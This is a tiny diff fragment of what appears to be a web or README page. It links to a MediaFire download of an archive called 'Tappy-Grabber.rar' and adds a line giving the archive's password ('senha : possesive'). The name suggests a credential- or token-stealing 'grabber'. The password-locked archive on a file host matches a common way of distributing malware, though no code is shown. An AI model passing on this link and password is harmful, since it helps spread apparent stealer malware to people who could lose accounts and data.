@@ -29,6 +29,7 @@
 
 <br>
 💸 <b>• DOWNLOAD :</b> https://www.mediafire.com/file/rcx04wy7k9iqgtc/Tappy-Grabber.rar/file
+senha : possesive
 <br>
 <br>
 
